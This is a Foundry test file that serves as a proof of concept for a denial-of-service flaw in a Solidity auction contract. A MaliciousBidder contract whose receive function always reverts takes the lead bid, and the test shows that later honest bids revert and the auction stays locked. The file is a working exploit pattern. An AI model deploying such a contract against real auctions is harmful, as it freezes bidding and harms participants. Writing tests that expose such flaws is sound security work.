// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/auction.sol";

contract MaliciousBidder {
    // This contract will intentionally fail when receiving funds
    receive() external payable {
        revert("Malicious contract rejecting payments");
    }
}

contract DosAuctionTest is Test {
    DosAuction auction;
    address owner = address(1);
    address honestBidder = address(2);
    MaliciousBidder maliciousBidder;

    function setUp() public {
        vm.startPrank(owner);
        auction = new DosAuction();
        auction.startAuction(1 days);
        vm.stopPrank();

        maliciousBidder = new MaliciousBidder();
        vm.deal(honestBidder, 10 ether);
        vm.deal(address(maliciousBidder), 10 ether);
    }

    function testDenialOfServiceAttack() public {
        // Step 1: Malicious bidder places initial bid
        vm.prank(address(maliciousBidder));
        auction.bid{value: 1 ether}();

        // Verify initial state setup
        assertEq(auction.currentFrontrunner(), address(maliciousBidder));
        assertEq(auction.currentBid(), 1 ether);

        console.log("--- BEFORE-Trigger Honest Bid Attempt ---");
        address frontrunnerBefore = auction.currentFrontrunner();
        uint256 currentBidBefore = auction.currentBid();
        uint256 totalBidsBefore = auction.totalBids();
        uint256 honestBidderCountBefore = auction.bidCount(honestBidder);

        console.log("Frontrunner Address:", frontrunnerBefore);
        console.log("Current Bid Amount:", currentBidBefore);
        console.log("Total Bids Count:", totalBidsBefore);
        console.log("Honest Bidder Bid Count:", honestBidderCountBefore);

        console.log("--- Trigger Honest Bid ---");
        // Step 2: Honest bidder attempts to outbid (should revert)
        vm.prank(honestBidder);
        vm.expectRevert();
        auction.bid{value: 2 ether}();

        console.log("--- AFTER-Trigger Honest Bid Attempt ---");
        address frontrunnerAfter = auction.currentFrontrunner();
        uint256 currentBidAfter = auction.currentBid();
        uint256 totalBidsAfter = auction.totalBids();
        uint256 honestBidderCountAfter = auction.bidCount(honestBidder);

        console.log("Frontrunner Address:", frontrunnerAfter);
        console.log("Current Bid Amount:", currentBidAfter);
        console.log("Total Bids Count:", totalBidsAfter);
        console.log("Honest Bidder Bid Count:", honestBidderCountAfter);

        // Verify auction state remains unchanged
        bool stateUnchanged = 
            (frontrunnerBefore == frontrunnerAfter) &&
            (currentBidBefore == currentBidAfter) &&
            (totalBidsBefore == totalBidsAfter) &&
            (honestBidderCountBefore == honestBidderCountAfter);
        
        console.log("Auction State Unchanged After Honest Bid?",
            stateUnchanged ? "YES: DoS Successful" : "NO: Auction Updated"
        );

        // Step 3: Verify auction remains stuck
        vm.prank(honestBidder);
        vm.expectRevert();
        auction.bid{value: 5 ether}();

        // Final vulnerability verdict
        if (stateUnchanged) {
            console.log("Vulnerability Exists: Bid state locked by malicious contract revert");
        } else {
            console.log("Vulnerability not Exist: Auction successfully processed honest bid");
        }
    }
}